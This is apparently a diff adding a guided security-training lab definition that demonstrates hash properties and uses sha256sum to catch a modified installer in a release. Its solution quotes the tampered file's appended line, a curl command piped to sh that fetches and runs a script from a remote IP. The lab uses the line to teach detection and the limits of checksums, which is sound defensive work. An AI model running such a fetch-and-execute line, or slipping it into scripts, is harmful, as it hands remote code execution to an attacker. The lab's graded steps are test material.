@@ -1,0 +1,232 @@
+id: lab.what-a-hash-guarantees
+topic: topic.hashing-and-passwords
+title: What a hash guarantees, demonstrated rather than asserted
+type: guided
+tier: 2
+image: groundwork/lab-foundations:1
+duration_minutes: 20
+objectives: [OBJ-A04.1.1, OBJ-A04.1.2, OBJ-A04.1.3]
+
+intro: >-
+  Four properties get claimed about hash functions, and all four are easy to
+  check. You will check them, on a real implementation, and then use the result
+  to catch a file that was modified after its checksums were published.
+
+
+  The last step is the one that matters operationally: a mismatch is a fact
+  about bytes, and people routinely read more into it than it supports.
+
+setup:
+  - /opt/lab/seed-hashing.sh
+
+steps:
+  - id: s1
+    instruction: >-
+      Demonstrate that hashing is deterministic and fixed-size. Hash the same
+      short input twice and a one-megabyte file once, and save all three digests
+      to /tmp/answer-fixed.
+    hint: >-
+      `printf 'hello' | sha256sum` twice, and `head -c 1000000 /dev/urandom >
+      big.bin` for something large. Compare the lengths of the digests, not the
+      inputs.
+    walkthrough: |
+      cd /tmp
+      head -c 1000000 /dev/urandom > big.bin
+      {
+        printf 'hello' | sha256sum
+        printf 'hello' | sha256sum
+        sha256sum big.bin
+      } > /tmp/answer-fixed
+      cat /tmp/answer-fixed
+      awk '{print length($1)}' /tmp/answer-fixed
+    verify:
+      - type: command_exit
+        command: "test $(awk '{print $1}' /tmp/answer-fixed | head -2 | sort -u | wc -l) -eq 1"
+        exit_code: 0
+        describe: The same input hashed twice gave the same digest
+      - type: command_exit
+        command: "test $(awk '{print length($1)}' /tmp/answer-fixed | sort -u | wc -l) -eq 1"
+        exit_code: 0
+        describe: Five bytes and a megabyte produced digests of identical length
+
+  - id: s2
+    instruction: >-
+      Demonstrate the avalanche property. Hash two inputs differing by exactly
+      one byte and save both digests to /tmp/answer-avalanche, then count how
+      many leading hex characters they share.
+    hint: >-
+      `printf 'hello'` and `echo hello` differ by one trailing newline. That is
+      the smallest change you can make without thinking about it — and it is
+      also the most common reason a digest "does not match".
+    walkthrough: |
+      {
+        printf 'hello' | sha256sum
+        echo hello | sha256sum
+      } > /tmp/answer-avalanche
+      cat /tmp/answer-avalanche
+      a=$(sed -n 1p /tmp/answer-avalanche | cut -c1-64)
+      b=$(sed -n 2p /tmp/answer-avalanche | cut -c1-64)
+      i=1
+      while [ $i -le 64 ]; do
+        [ "$(echo "$a" | cut -c$i)" = "$(echo "$b" | cut -c$i)" ] || break
+        i=$((i+1))
+      done
+      echo "shared leading hex characters: $((i-1))" >> /tmp/answer-avalanche
+      tail -1 /tmp/answer-avalanche
+    verify:
+      - type: command_exit
+        command: "test $(awk 'NR<=2{print $1}' /tmp/answer-avalanche | sort -u | wc -l) -eq 2"
+        exit_code: 0
+        describe: One byte of difference produced two unrelated digests
+      - type: file_matches
+        path: /tmp/answer-avalanche
+        pattern: "shared leading hex characters: [0-3]$"
+        describe: They share almost no leading characters — there is no such thing as a near match
+
+  - id: s3
+    instruction: >-
+      Show that encoding is not hashing. Base64-encode a password, reverse it,
+      then try to reverse a digest of the same password. Save what happened to
+      /tmp/answer-encoding.
+    hint: >-
+      `base64` has a `-d`. Look for the equivalent flag on `sha256sum` in its
+      `--help` output, and record what you find.
+    walkthrough: |
+      {
+        echo "base64 round trip:"
+        printf 'hunter2' | base64
+        printf 'hunter2' | base64 | base64 -d; echo
+        echo
+        echo "sha256 attempt to reverse:"
+        printf 'hunter2' | sha256sum
+        sha256sum --help 2>&1 | grep -ci -- '--decode' || echo "no decode option exists"
+        echo "base64 is reversible by anyone and protects nothing; sha256 has no decode flag because the operation destroys information and no procedure recovers the input"
+      } > /tmp/answer-encoding
+      cat /tmp/answer-encoding
+    verify:
+      - type: file_matches
+        path: /tmp/answer-encoding
+        pattern: "hunter2"
+        describe: The base64 round trip recovered the original in full
+      - type: file_matches
+        path: /tmp/answer-encoding
+        pattern: "reversible|protects nothing"
+        describe: And you recorded that encoding is not a protection
+
+  - id: s4
+    instruction: >-
+      A release was published in /tmp/downloads with a SHA256SUMS file. Verify
+      it and save the full result to /tmp/answer-verify.
+    hint: >-
+      `sha256sum -c` reads the sums file and checks every entry. Run it from
+      inside the directory, and keep its exit status.
+    walkthrough: |
+      cd /tmp/downloads
+      sha256sum -c SHA256SUMS > /tmp/answer-verify 2>&1
+      echo "rc=$?" >> /tmp/answer-verify
+      cat /tmp/answer-verify
+    verify:
+      - type: file_matches
+        path: /tmp/answer-verify
+        pattern: "installer\\.sh: FAILED"
+        describe: The verification identified the file that does not match
+      - type: file_matches
+        path: /tmp/answer-verify
+        pattern: "rc=1"
+        describe: And the command exited non-zero, so a pipeline would catch it
+
+  - id: s5
+    instruction: >-
+      Find what changed in the failing file, then write to
+      /tmp/answer-what-it-proves what the mismatch does and does not establish.
+    hint: >-
+      The file is short — read it. Then think carefully about whether a
+      mismatch tells you it was tampered with, and whether a *match* would have
+      told you the file was safe.
+    walkthrough: |
+      cd /tmp/downloads
+      {
+        echo "--- the file as delivered:"
+        cat installer.sh
+        echo
+        echo "the last line fetches and executes a remote script, which the README does not mention"
+        echo
+        echo "what the mismatch proves: the bytes on disk are not the bytes that were hashed when SHA256SUMS was written. that is all it proves."
+        echo "what it does not prove: whether the change was tampering or corruption - a hash cannot distinguish them, and both mean do not use this file"
+        echo "what a match would not have proved: that the file is safe. it would only mean the file agrees with SHA256SUMS, and whoever replaced the file could replace that too. the check is only meaningful if the digest reached me through a channel the attacker does not control"
+      } > /tmp/answer-what-it-proves
+      cat /tmp/answer-what-it-proves
+    verify:
+      - type: file_matches
+        path: /tmp/answer-what-it-proves
+        pattern: "not the bytes"
+        describe: You stated what a mismatch establishes about the bytes
+      - type: file_matches
+        path: /tmp/answer-what-it-proves
+        pattern: "tamper|corrupt"
+        describe: And that a hash cannot say which kind of change it was
+      - type: file_matches
+        path: /tmp/answer-what-it-proves
+        pattern: "channel|same server|replace"
+        describe: And that a digest from the same source as the file proves little
+
+solution: >-
+  **The properties, in the order you demonstrated them.**
+
+
+  *Deterministic and fixed-size.* Two runs over `hello` gave a single distinct
+  digest, and a megabyte of random data gave a digest of exactly the same length
+  — 64 hex characters, 32 bytes, always. The digest carries no information about
+  how much went in.
+
+
+  *Avalanche.* `printf 'hello'` and `echo hello` differ by a single trailing
+  newline, and their digests share essentially no leading characters. This is
+  why digests are compared for equality and nothing else: there is no "close",
+  and a diff of two digests tells you nothing about how different the inputs
+  were.
+
+
+  It is also the single most common practical confusion. A digest that does not
+  match a published value is very often `echo` adding a newline rather than
+  anything sinister.
+
+
+  *Not reversible.* `base64 -d` exists; there is no `sha256sum -d`, and its
+  absence is structural rather than an oversight. Five bytes in, thirty-two out;
+  a gigabyte in, thirty-two out. The information is gone.
+
+
+  Which means finding credentials base64-encoded in a config file is finding
+  them in **plaintext**. The scrambled appearance is the only thing base64
+  contributes.
+
+
+  **The verification, and what it is worth.**
+
+
+  `sha256sum -c SHA256SUMS` reported `installer.sh: FAILED` and exited 1. The
+  appended line — `curl -s http://198.51.100.7/x | sh` — is the kind of change
+  that survives a read-through, because the rest of the file is exactly what it
+  claims to be.
+
+
+  Three statements about that result, and the third is the one people skip:
+
+
+  1. **It proves the bytes differ from the bytes that were hashed.** Nothing
+     more. A hash has no concept of intent.
+
+  2. **It cannot distinguish tampering from corruption**, and you should not
+     spend time guessing. Both answers are "do not use this file".
+
+  3. **A match would not have proved the file was safe.** It would have proved
+     the file agrees with `SHA256SUMS` — and anyone able to replace the file on
+     a mirror can replace the sums file beside it. The check only means something
+     when the digest arrives through a channel the attacker does not control.
+
+
+  That third point is the whole reason signatures exist, and it is what the
+  certificates topic later in this course is for. A digest answers *did these
+  bytes change*. It cannot answer *is this from who I think*, and no amount of
+  hashing will make it.
